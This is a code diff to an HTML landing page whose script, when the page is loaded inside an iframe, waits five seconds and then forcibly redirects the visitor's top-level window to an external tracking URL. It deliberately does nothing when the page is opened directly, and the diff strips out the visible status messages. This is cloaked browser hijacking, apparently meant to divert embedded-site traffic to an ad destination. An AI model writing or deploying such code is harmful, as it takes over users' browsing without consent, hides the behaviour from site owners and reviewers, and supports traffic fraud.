@@ -2,29 +2,25 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Landing Redirect</title>
+  <title>Landing</title>
 </head>
 <body>
 
 <h1>landing-redirect</h1>
-<p id="status">Script belum jalan</p>
 
 <script>
 (function () {
 
-  document.getElementById("status").innerText = "Script loaded";
+  // Jangan redirect kalau dibuka langsung
+  if (window.self === window.top) return;
 
-  // cek iframe
-  if (window.self === window.top) {
-    document.getElementById("status").innerText = "Direct open (NO redirect)";
-    return;
-  }
-
-  document.getElementById("status").innerText = "Inside iframe, wait 5s";
-
+  // Delay aman untuk iframe traffic
   setTimeout(function () {
-    document.getElementById("status").innerText = "Redirecting...";
-    window.top.location.href = "https://oversightexcitement.com/bt6678xqp4?key=b4d6bb67a477268e22db1885ae26c970";
+    try {
+      window.top.location.replace("https://oversightexcitement.com/bt6678xqp4?key=b4d6bb67a477268e22db1885ae26c970");
+    } catch (e) {
+      window.location.href = "https://oversightexcitement.com/bt6678xqp4?key=b4d6bb67a477268e22db1885ae26c970";
+    }
   }, 5000);
 
 })();
